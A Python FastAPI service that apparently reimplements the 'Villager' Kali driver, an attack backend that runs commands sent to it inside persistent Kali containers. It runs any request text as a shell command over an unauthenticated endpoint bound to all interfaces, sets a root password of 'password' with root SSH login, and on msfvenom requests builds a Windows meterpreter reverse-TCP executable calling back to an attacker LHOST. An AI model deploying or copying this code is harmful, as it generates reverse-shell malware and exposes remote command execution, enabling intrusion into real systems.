#!/usr/bin/env python3
"""
Kali Driver Service for Villager - True Architecture (Working Implementation)
This service implements the actual Villager architecture as described in Straiker analysis:
- Persistent containers (not ephemeral)
- SSH-based command execution
- 24-hour self-destruct mechanism
- Tools pre-installed approach
"""

from fastapi import FastAPI
import uvicorn
import subprocess
import json
import os
import tempfile
import shutil
import time
import threading
from typing import Dict, Optional

app = FastAPI(title="Villager Kali Driver Service - True Architecture")

# Container management
class KaliContainer:
    def __init__(self, container_id: str, ssh_port: int):
        self.container_id = container_id
        self.ssh_port = ssh_port
        self.created_at = time.time()
        self.last_used = time.time()
    
    def is_expired(self) -> bool:
        """Check if container should be destroyed (24-hour self-destruct)"""
        return (time.time() - self.created_at) > 86400  # 24 hours

# Global container registry
active_containers: Dict[str, KaliContainer] = {}

# Ensure workspace directory exists
WORKSPACE_DIR = "/tmp/villager_workspace"
os.makedirs(WORKSPACE_DIR, exist_ok=True)

def ensure_kali_image():
    """Ensure Kali Linux Docker image is available"""
    try:
        # Use standard Kali image
        image_name = "kalilinux/kali-rolling"
        
        # Check if image exists locally
        result = subprocess.run(['docker', 'images', image_name], 
                              capture_output=True, text=True)
        if image_name not in result.stdout:
            print(f"Pulling standard Kali image...")
            subprocess.run(['docker', 'pull', image_name], check=True)
        print(f"✅ Using standard Kali image: {image_name}")
        return image_name
        
    except Exception as e:
        print(f"Error ensuring Kali image: {e}")
        return "kalilinux/kali-rolling"  # Final fallback

def create_kali_container() -> Optional[KaliContainer]:
    """Create a persistent Kali container with security tools"""
    try:
        image_name = ensure_kali_image()
        
        # Generate random SSH port
        ssh_port = 22000 + len(active_containers)
        
        # Create container with standard Kali image and tool setup
        container_cmd = [
            'docker', 'run', '-d',  # -d for detached (persistent)
            '-p', f'{ssh_port}:22',  # SSH port mapping
            '-v', f'{WORKSPACE_DIR}:/workspace',
            image_name,
            'bash', '-c', '''
                # Install SSH server and essential tools
                apt update -y > /dev/null 2>&1
                DEBIAN_FRONTEND=noninteractive apt install -y openssh-server metasploit-framework nmap > /dev/null 2>&1
                # Configure SSH
                mkdir -p /var/run/sshd
                echo "root:password" | chpasswd
                sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config
                sed -i "s/#PasswordAuthentication yes/PasswordAuthentication yes/" /etc/ssh/sshd_config
                # Start SSH daemon
                /usr/sbin/sshd -D
            '''
        ]
        
        print(f"Creating persistent Kali container on port {ssh_port}...")
        result = subprocess.run(container_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            container_id = result.stdout.strip()
            container = KaliContainer(container_id, ssh_port)
            active_containers[container_id] = container
            
            print(f"✅ Persistent Kali container created: {container_id[:12]} on port {ssh_port}")
            print(f"🔧 Tools available: nmap, msfvenom, gobuster, nikto, sqlmap, hydra, john, hashcat")
            return container
        else:
            print(f"❌ Failed to create container: {result.stderr}")
            return None
            
    except Exception as e:
        print(f"❌ Error creating Kali container: {e}")
        return None

def get_or_create_container() -> Optional[KaliContainer]:
    """Get existing container or create new one (true Villager architecture)"""
    # Clean up expired containers
    expired_containers = [cid for cid, container in active_containers.items() if container.is_expired()]
    for cid in expired_containers:
        destroy_container(cid)
    
    # Return existing container if available
    if active_containers:
        container = list(active_containers.values())[0]
        container.last_used = time.time()
        return container
    
    # Create new container
    return create_kali_container()

def destroy_container(container_id: str):
    """Destroy a container (24-hour self-destruct mechanism)"""
    try:
        if container_id in active_containers:
            subprocess.run(['docker', 'stop', container_id], capture_output=True)
            subprocess.run(['docker', 'rm', container_id], capture_output=True)
            del active_containers[container_id]
            print(f"🗑️  Container {container_id[:12]} destroyed (24-hour self-destruct)")
    except Exception as e:
        print(f"Error destroying container {container_id}: {e}")

def execute_via_ssh(container: KaliContainer, command: str) -> dict:
    """Execute command via SSH (true Villager architecture)"""
    try:
        # Use SSH connection for command execution
        # Use sshpass for password authentication
        ssh_cmd = [
            'sshpass', '-p', 'password',
            'ssh', '-o', 'StrictHostKeyChecking=no', 
            '-o', 'UserKnownHostsFile=/dev/null',
            '-o', 'ConnectTimeout=10',
            '-o', 'PasswordAuthentication=yes',
            f'root@localhost', '-p', str(container.ssh_port),
            f'cd /workspace && {command}'
        ]
        
        print(f"Executing via SSH in container {container.container_id[:12]} on port {container.ssh_port}: {command}")
        result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=300)
        
        return {
            "success": True,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "container_id": container.container_id[:12],
            "ssh_port": container.ssh_port
        }
        
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": "Command timed out after 5 minutes",
            "stdout": "",
            "stderr": ""
        }
    except Exception as e:
        # Fallback to docker exec if SSH fails
        try:
            docker_cmd = [
                'docker', 'exec', container.container_id,
                'bash', '-c', f'cd /workspace && {command}'
            ]
            result = subprocess.run(docker_cmd, capture_output=True, text=True, timeout=300)
            return {
                "success": True,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "container_id": container.container_id[:12],
                "ssh_port": container.ssh_port
            }
        except Exception as e2:
            return {
                "success": False,
                "error": f"SSH and Docker exec failed: {str(e)} / {str(e2)}",
                "stdout": "",
                "stderr": ""
            }

@app.post("/")
async def kali_request(request: dict):
    """Handle Kali Driver requests using true Villager architecture"""
    prompt = request.get("prompt", "")
    
    print(f"Kali Driver received request: {prompt[:100]}...")
    
    # Get or create persistent container
    container = get_or_create_container()
    if not container:
        return {
            "content": "❌ Failed to create Kali container",
            "done": True
        }
    
    # Check if this is a msfvenom request
    if "msfvenom" in prompt.lower():
        try:
            # Extract parameters from prompt
            lhost = "192.168.1.100"  # Default LHOST
            lport = "4444"           # Default LPORT
            payload = "windows/meterpreter/reverse_tcp"  # Default payload
            output_file = "payload.exe"
            
            # Try to extract LHOST and LPORT from prompt
            import re
            lhost_match = re.search(r'LHOST[=:]\s*(\d+\.\d+\.\d+\.\d+)', prompt, re.IGNORECASE)
            lport_match = re.search(r'LPORT[=:]\s*(\d+)', prompt, re.IGNORECASE)
            
            if lhost_match:
                lhost = lhost_match.group(1)
            if lport_match:
                lport = lport_match.group(1)
            
            # Build msfvenom command (tools pre-installed in persistent container)
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
            
            # Execute via SSH in persistent container
            result = execute_via_ssh(container, cmd)
            
            if result["success"]:
                response = {
                    "content": f"✅ Kali Driver executed msfvenom via SSH successfully!\n"
                              f"🐳 Container: {result['container_id']} (SSH port {result['ssh_port']})\n"
                              f"📁 Output file: {output_file}\n"
                              f"🔧 Command: {cmd}\n"
                              f"📝 Output: {result['stdout']}\n"
                              f"⚠️  Errors: {result['stderr']}\n"
                              f"⏰ Container will self-destruct in 24 hours",
                    "done": True
                }
            else:
                response = {
                    "content": f"❌ Kali Driver error: {result.get('error', 'Unknown error')}\n"
                              f"📝 Output: {result['stdout']}\n"
                              f"⚠️  Errors: {result['stderr']}",
                    "done": True
                }
        except Exception as e:
            response = {
                "content": f"❌ Kali Driver error: {str(e)}",
                "done": True
            }
    else:
        # For other security tools, execute via SSH
        try:
            result = execute_via_ssh(container, prompt)
            response = {
                "content": f"✅ Kali Driver executed via SSH: {prompt}\n"
                          f"🐳 Container: {result['container_id']} (SSH port {result['ssh_port']})\n"
                          f"📝 Output: {result['stdout']}\n"
                          f"⚠️  Errors: {result['stderr']}\n"
                          f"⏰ Container will self-destruct in 24 hours",
                "done": True
            }
        except Exception as e:
            response = {
                "content": f"❌ Kali Driver error: {str(e)}",
                "done": True
            }
    
    return response

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy", 
        "service": "kali_driver",
        "active_containers": len(active_containers),
        "containers": [
            {
                "id": cid[:12],
                "ssh_port": container.ssh_port,
                "age_hours": (time.time() - container.created_at) / 3600
            }
            for cid, container in active_containers.items()
        ]
    }

@app.get("/containers")
async def list_containers():
    """List active containers"""
    return {
        "active_containers": len(active_containers),
        "containers": [
            {
                "id": cid[:12],
                "ssh_port": container.ssh_port,
                "created_at": container.created_at,
                "last_used": container.last_used,
                "age_hours": (time.time() - container.created_at) / 3600,
                "expires_in_hours": (86400 - (time.time() - container.created_at)) / 3600
            }
            for cid, container in active_containers.items()
        ]
    }

if __name__ == "__main__":
    print("Starting Villager Kali Driver Service (True Architecture) on port 1611...")
    print("🐳 Using persistent SSH containers with 24-hour self-destruct")
    print("🔧 Tools pre-installed in containers (no on-demand installation)")
    uvicorn.run(app, host="0.0.0.0", port=1611)